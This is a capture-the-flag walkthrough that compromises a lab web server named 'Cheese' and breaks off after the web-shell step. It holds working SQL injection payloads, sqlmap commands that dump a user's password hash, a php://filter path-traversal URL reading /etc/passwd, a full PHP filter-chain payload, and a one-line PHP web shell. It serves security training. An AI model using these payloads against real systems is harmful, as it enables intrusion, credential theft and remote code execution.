# Cheese CTF 🧀


## ``nmap scan``

```
nmap -sCV 10.10.0.223
```

![image](https://github.com/user-attachments/assets/c6f79a9d-c448-47f2-9fd6-1ba6289318e0)



## ``gobuster``

```
gobuster dir -u http://10.10.0.223/ -w /home/kali/Downloads/wordlists/directory-list-2.3-medium.txt
```

![image](https://github.com/user-attachments/assets/6ad6f0aa-b52b-42d5-bc70-7a7b89d02d90)





## ``ffuf``
> you can sue ``ffuf`` to fuzz and bypass login page :

```
ffuf -w SQL_login_bypass.txt -X POST -u http://10.10.0.223/login.php -d 'username=FUZZ&password=asdf' -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -fw 227
```

``found``

![image](https://github.com/user-attachments/assets/24c827a5-71b9-4e89-a18a-ebebe14f79fb)


```
' OR 'x'='x'#;          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 166ms]
'-''-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'-''#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 98ms]
'^''-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 96ms]
'^''#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 96ms]
'*''-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 95ms]
'*''#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 95ms]
'=''-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 95ms]
'=''#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 108ms]
'oR'2'LiKE'2'-- 2       [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 105ms]
'oR'2'LiKE'2'#          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 117ms]
' UniON SElecT 1,2,3-- 2 [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 97ms]
' UniON SElecT 1,2,3#   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 97ms]
'UniON(SElecT(1),2,3)-- 2 [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 93ms]
'UniON(SElecT(1),2,3)#  [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 106ms]
'||2-- 2                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 94ms]
'||'2'||'               [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 93ms]
'||2#                   [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 94ms]
'||2||'                 [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 99ms]
'||'2'='2'||'           [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'||2=2-- 2              [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 93ms]
'||2=2#                 [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'||2=2||'               [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'||true||'              [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 114ms]
'||true-- 2             [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 114ms]
'||'2'LiKE'2'-- 2       [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 98ms]
'||'2'LiKE'2'#          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 98ms]
'||true#                [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 114ms]
'||'2'LiKE'2'||'        [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 96ms]
'||(2)LiKE(2)-- 2       [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 97ms]
'||(2)LiKE(2)#          [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 92ms]
'||(2)LiKE(2)||'        [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 95ms]
%A8%27||1-- 2           [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 136ms]
%bf'||1-- 2             [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 133ms]
%8C%A8%27||1-- 2        [Status: 302, Size: 792, Words: 217, Lines: 26, Duration: 133ms]
:: Progress: [804/804] :: Job [1/1] :: 334 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
```





----
----

<details>
   <summary>inject manual</summary>

> first try ``' or 1=1; -- -`` but not work

``try union``

```
' union select 1 -- -
' union select 1,2 -- -
' union select 1,2,3 -- -
```
and Boom!!! 

it work on 3 columns and bypassed login 

> if you try to extract data from this and appear database content it will not apper ✅ SQLi exists, ❌ but data can’t be extracted via this page.

</details>

----
----


## ``SQLmap``

```
sqlmap -u "http://10.10.0.223/login.php" --data="username=admin&password=pass" --level=5 --risk=3 --threads=5 --dbs
```

``found databases``

```
available databases [2]:
[*] information_schema
[*] users
```

![image](https://github.com/user-attachments/assets/826eb9e0-20b7-4a08-a192-213def942148)


``find tables in users database``

```
sqlmap -u "http://10.10.0.223/login.php" --data="username=admin&password=pass" -D users --tables
```

``found users table``

![image](https://github.com/user-attachments/assets/36fa6cb3-89fb-493b-8c00-afb08453340c)


``get content of users``

```
sqlmap -u "http://10.10.0.223/login.php" --data="username=admin&password=pass" -D users -T users --dump
```

![image](https://github.com/user-attachments/assets/dddc5c59-a882-4c82-b594-6f474d955d26)

```
retrieved: 5b0c2e1b4fe1410e47f26feff7f4fc4c
retrieved: comte
```
```
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 5b0c2e1b4fe1410e47f26feff7f4fc4c | comte    |
+----+----------------------------------+----------+
```


> ### tryed to hash password but not found crack to it so try to found another way to get in system


## ``path traversal``

after bypass login page found :


![image](https://github.com/user-attachments/assets/51963ef7-59a5-4c25-8bfa-81317651aa83)

try to make url like ``http://10.10.0.223/secret-script.php?file=php://filter/resource=../../../../etc/passwd`` found

![image](https://github.com/user-attachments/assets/9231f3b9-6553-4b70-b9db-40bb92ee361a)

Boom !!!

> notice we found in /etc/passwd our user we found ``comte``

> ### ``that can make use do LFI2RCE using PHP Filters``

we will do it with ``php_filter_chain_generator.py`` >> https://github.com/synacktiv/php_filter_chain_generator

- First, we keep it simple and generate a payload to display the phpinfo page to see if filter chaining is possible.

```
python3 php_filter_chain_generator.py --chain '<?php phpinfo();?>'
```

![image](https://github.com/user-attachments/assets/71137a37-0302-4072-ad03-5a5215aaf5a0)


```
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp
```

``put this payload in url``

```
http://10.10.180.156/secret-script.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR%7Cco..............
```

![image](https://github.com/user-attachments/assets/52d5ff76-1db1-40fa-87af-4fa9e10296cf)


> We give the payload to the file parameter and see the phpinfo page after loading the page. LFI2RCE via PHP filters seems to be possible.

``Next, we generate a payload with the smallest possible PHP web shell.``

```
python3 php_filter_chain_generator.py --chain '<?=`$_GET[0]`?>'
```
``put the output in url``

![image](https://github.com/user-attachments/assets/466dee0f-ad17-4e3e-88a5-57f1c7d08f29)

> We now want to have a more interactive reverse shell. To do this, we spawn a reverse shell. We build a ``Bash -i`` reverse shell using ``revshells.com`` and encode it in base64.

![image](https://github.com/user-attachments/assets/6d5ffdb6-ecdd-4d81-b797-3906d631d02f)













